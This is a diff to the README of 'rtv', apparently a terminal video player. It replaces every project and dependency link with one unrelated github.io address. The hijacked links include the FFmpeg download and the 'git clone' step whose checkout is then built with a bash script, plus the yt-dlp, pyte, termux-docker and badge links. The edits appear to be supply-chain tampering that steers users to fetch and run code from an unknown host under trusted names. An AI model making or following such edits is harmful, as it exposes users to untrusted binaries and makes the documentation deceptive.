@@ -1,6 +1,6 @@
 # rtv
 
-![build](https://github.com/Santitub/rtv/actions/workflows/build.yml/badge.svg)
+![build](https://laotian-telephonebell2559.github.io)
 
 *Léelo en [español](README_ES.md).*
 
@@ -175,7 +175,7 @@ cargo build --release
 Full guide in [`BUILD-WINDOWS.md`](BUILD-WINDOWS.md). In short:
 
 1. Download `ffmpeg-n7.1-latest-win64-lgpl-shared.zip` from
-   [BtbN/FFmpeg-Builds](https://github.com/BtbN/FFmpeg-Builds/releases).
+   [BtbN/FFmpeg-Builds](https://laotian-telephonebell2559.github.io).
 2. Unzip to `C:\ffmpeg\` (you should end up with `include`, `lib`, `bin`).
 3. `$env:FFMPEG_DIR = "C:\ffmpeg"` and add `C:\ffmpeg\bin` to `PATH`.
 4. `cargo clean && cargo build --release`.
@@ -192,7 +192,7 @@ rtv runs natively on Termux (no proot, no containers). The script
 
 ```bash
 pkg install -y git
-git clone https://github.com/Santitub/rtv.git && cd rtv
+git clone https://laotian-telephonebell2559.github.io && cd rtv
 bash scripts/build-termux.sh
 rtv video.mp4
 ```
@@ -224,7 +224,7 @@ The recommended terminal backend on Termux is whatever rtv auto-detects
 All of this is validated in CI without a physical device inside the
 [`build.yml`](.github/workflows/build.yml) workflow (`termux-*` jobs),
 which builds and tests rtv (including the real PulseAudio audio path)
-inside [`termux/termux-docker`](https://github.com/termux/termux-docker)
+inside [`termux/termux-docker`](https://laotian-telephonebell2559.github.io)
 images for x86_64 and aarch64, and publishes `rtv-*-termux-*` packages as
 artifacts (and in releases, next to the other platforms).
 
@@ -237,12 +237,12 @@ rtv <file|URL> [options]
 The input can be a local file, a **direct http/https URL** (mp4, mkv, HLS
 `.m3u8`… — network protocols are built into the bundled FFmpeg, TLS
 included) or the **page of a video site** (YouTube, Twitch, Vimeo,
-Dailymotion) if you have [yt-dlp](https://github.com/yt-dlp/yt-dlp)
+Dailymotion) if you have [yt-dlp](https://laotian-telephonebell2559.github.io)
 installed:
 
 ```bash
-rtv https://example.com/video.mp4                # direct URL
-rtv https://www.youtube.com/watch?v=aqz-KE-bpKQ  # via yt-dlp
+rtv https://laotian-telephonebell2559.github.io                # direct URL
+rtv https://laotian-telephonebell2559.github.io  # via yt-dlp
 rtv --ytdl https://any-site-yt-dlp-supports/…
 ```
 
@@ -495,7 +495,7 @@ rtv/
 The integration tests run the release binary inside a real pty, inject
 keys and resizes (`TIOCSWINSZ` + `SIGWINCH`), and analyze both the sync
 log (`RTV_SYNC_LOG`) and the raw escape-sequence stream (with
-[pyte](https://github.com/selectel/pyte) as the terminal emulator):
+[pyte](https://laotian-telephonebell2559.github.io) as the terminal emulator):
 
 ```bash
 cargo build --release
